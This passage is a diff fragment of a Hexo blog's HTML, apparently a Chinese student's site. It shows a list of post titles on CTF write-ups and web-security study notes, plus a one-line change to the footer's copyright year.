href="/2018/05/27/2018-12/">2018年大一下学期第12周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/BugKu-MISC-WriteUp/">BugKuCTF训练平台MISC题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/24/NanYouCTF-Crypto-WriteUp/">南京邮电大学网络攻防训练平台密码学题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/22/BugKu-Web-Welcome-WriteUp/">BugKuCTF-Web题 Welcome to bugkuctf Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/22/NanYouCTF-MISC-WriteUp/">南京邮电大学网络攻防训练平台MISC题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/20/NanYouCTF-Web-WriteUp/">南京邮电大学网络攻防训练平台Web题Write-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/20/2018-11/">2018年大一下学期第11周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/17/Makerctf-Wp/">MakerCTF Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/15/ShiYanBa-EasySqli3/">实验吧CTF-简单的sql注入之3</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/2018-10/">2018年大一下学期第十周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/12/Easy-Unserialize-Writeup/">php反序列化组会例题和makerctf easy_unserialize的wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/PHP-Unseriablize/">php反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/06/2018-9/">2018年大一下学期第9周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/06/XSS2/">XSS学习笔记:反射型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/05/XSS1/">XSS学习笔记:入门篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/02/Webfront4/">Web前端黑客技术揭秘第2章（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/2018-8/">2018年大一下学期第8周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/ISCC-2018-web6/">ISCC-2018 web题"SQL注入的艺术" write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/30/Webfront3/">Web前端黑客技术揭秘第2章（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/29/Webfront2/">Web前端黑客技术揭秘第2章（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/28/Webfront1/">Web前端黑客技术揭秘第1章</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/27/XueXijiHua/">近期的学习计划</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/27/BugKu-Login3/">BugKuCTF-Login3的Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/26/Task/">第十一届全国大学生信息安全竞赛创新实践能力赛在线初赛赛前模拟测试（1/3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/26/RPO-wp/">K0rz3n师傅的RPO题目的wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/SQL-3/">SQL学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/23/SQL-2/">SQL学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/2018-7/">2018年大一下学期第七周总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/SQL-1/">SQL注入（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/XXE-Injection/">XXE Injection学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/Python-Selenium库/">Python Selenium库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/22/RPO/">RPO漏洞学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/21/Create/">博客创建</a></li></ul>
 
 
 
@@ -478,7 +492,7 @@
         <div id="footer-info">
             <div class="footer-left">
                 <i class="fa fa-copyright"></i> 
-                2016-2018 Double--R
+                2018 Double--R
             </div>
             <div class="footer-right">
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
